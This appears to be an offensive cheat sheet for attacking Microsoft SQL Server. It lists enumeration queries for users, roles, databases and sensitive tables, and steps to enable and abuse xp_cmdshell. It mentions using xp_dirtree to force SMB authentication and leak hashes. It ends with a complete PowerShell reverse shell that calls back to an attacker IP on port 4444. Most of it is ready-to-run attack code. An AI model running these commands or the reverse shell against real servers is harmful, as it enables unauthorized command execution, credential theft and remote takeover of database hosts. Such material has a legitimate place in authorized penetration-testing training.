https://juggernaut-sec.com/mssql/
```sql
-- Current user
SELECT SYSTEM_USER;

-- Connected login
SELECT ORIGINAL_LOGIN();

-- Current database
SELECT DB_NAME();

-- All databases
SELECT name FROM master.sys.databases;

-- SQL Server version
SELECT @@VERSION;
```

User Enumeration
```sql
-- Current user's roles
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 if yes

-- All logins
SELECT name, type_desc, is_disabled FROM sys.server_principals;

-- All database users
SELECT name FROM sys.database_principals WHERE type IN ('S', 'U');

-- Role memberships
SELECT r.name AS role_name, m.name AS member_name
FROM sys.database_role_members rm
JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id
JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id;
```

Objects
```sql
-- Tables in current database
SELECT name FROM sys.tables;

-- Columns in a specific table
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('your_table_name');

-- Stored procedures
SELECT name FROM sys.procedures;

-- Linked servers
EXEC sp_linkedservers;

-- Check for common sensitive tables
SELECT name FROM sysobjects WHERE xtype='U' AND name LIKE '%user%';

```

```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- Enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Run a command (if xp_cmdshell is enabled)
EXEC xp_cmdshell 'whoami';

-- Check current execution context
SELECT SYSTEM_USER, SESSION_USER, USER_NAME();
```

With access to the sql shell `xp_dirtree {path}` can be utilized to send an SMB request which can reveal hashes.

```
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.10'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"';

```